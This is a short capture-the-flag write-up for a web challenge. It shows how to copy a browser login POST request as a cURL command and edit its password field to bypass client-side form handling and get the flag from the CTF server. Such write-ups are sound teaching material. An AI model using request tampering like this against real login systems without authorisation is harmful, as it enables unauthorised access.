# 🔑🎚
* **Event:** EmojiMovieCTF (ISSS CTF 04-15-2022)
* **Problem Type:** Web

## Background
Whenever you submit a form, an HTTP request is generated. Typically this is a 
POST request (where the form data is contained within the request body) or a 
GET request (where the form data is contained within the URL itself). 

Forms are entirely handled on the client side, so it is possible to modify 
form submissions into whatever you want.

cURL is a command-line tool for crafting HTTP requests, and Chrome has a 
built-in way to generate commands specifically for cURL. 

## Exploit
The intended solution is to forge a network request. First open the developer
Network tab in your browser (right click -> Inspect Element -> Network at the 
top). Then click the login button. You should see a new request pop up in the
Network tab, a POST request called "login". Right click on it and choose
"Copy" -> "Copy as cURL". 

Now, here is the command that I copied from Chrome:
```
curl 'http://ctf.isss.io:7132/login' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  -H 'Cache-Control: max-age=0' \
  -H 'Connection: keep-alive' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'DNT: 1' \
  -H 'Origin: http://ctf.isss.io:7132' \
  -H 'Referer: http://ctf.isss.io:7132/' \
  -H 'Sec-Fetch-Dest: document' \
  -H 'Sec-Fetch-Mode: navigate' \
  -H 'Sec-Fetch-Site: same-origin' \
  -H 'Sec-Fetch-User: ?1' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36 Edg/100.0.1185.44' \
  -H 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="100", "Microsoft Edge";v="100"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  --data-raw 'password=50000000' \
  --compressed
```

As you can see, the password itself is encoded as part of the request. We can 
simply modify it in place, paste the command into our shell, and out comes the
flag!
